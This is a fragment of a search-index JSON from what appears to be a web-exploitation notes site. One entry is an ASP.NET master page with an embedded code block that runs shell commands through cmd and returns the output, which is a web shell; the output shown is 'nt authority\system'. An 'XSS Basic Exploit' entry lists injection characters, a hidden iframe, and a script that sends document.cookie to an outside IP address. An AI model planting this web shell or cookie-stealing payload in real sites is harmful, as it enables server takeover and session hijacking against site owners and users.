charset=utf-8\" /&gt;\n        &lt;meta name=\"application-name\" content=\"Butch\"&gt;\n        &lt;meta name=\"author\" content=\"Butch\"&gt;\n        &lt;meta name=\"description\" content=\"Butch\"&gt;\n        &lt;meta name=\"keywords\" content=\"Butch\"&gt;\n        &lt;link media=\"all\" href=\"style.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;\n        &lt;link id=\"favicon\" rel=\"shortcut icon\" type=\"image/png\" href=\"favicon.png\" /&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;div id=\"wrap\"&gt;\n            &lt;div id=\"header\"&gt;Welcome to Butch Repository&lt;/div&gt;\n            &lt;div id=\"main\"&gt;\n                &lt;div id=\"content\"&gt;\n                    &lt;br /&gt;\n                    &lt;asp:contentplaceholder id=\"ContentPlaceHolder1\" runat=\"server\"&gt;&lt;/asp:contentplaceholder&gt;\n                    &lt;br /&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n&lt;%\nstring stdout = \"\";\nstring cmd = \"whoami\";\nSystem.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(\"cmd\", \"/c \" + cmd);\nprocStartInfo.RedirectStandardOutput = true;\nprocStartInfo.UseShellExecute = false;\nprocStartInfo.CreateNoWindow = true;\nSystem.Diagnostics.Process p = new System.Diagnostics.Process();\np.StartInfo = procStartInfo;\np.Start();\nstdout = p.StandardOutput.ReadToEnd();\nResponse.Write(stdout);\n%&gt;\n</code></pre> <pre><code>&lt;/body&gt;\n&lt;/html&gt;\nnt authority\\system\n</code></pre>"},{"location":"web-application/exploitation/#xss-basic-exploit","title":"XSS Basic Exploit","text":"<p>Break code</p> <pre><code>&lt; &gt; ' \" { } ;\n</code></pre> <p>Content Injection</p> <pre><code>&lt;iframe src=http://ip/report height=\"0\" width=\"0\"&gt;&lt;/iframe&gt;\n</code></pre> <p>Stealing Cookies and Session Information</p> <pre><code>&lt;script&gt;new Image().src=\"http://10.11.0.4/cool.jpg?output=\"+document.cookie;&lt;/script&gt;\n</code></pre>"},{"location":"blog/archive/2024/","title":"2024","text":""},{"location":"blog/category/search/","title":"Search","text":""},{"location":"blog/category/performance/","title":"Performance","text":""}]}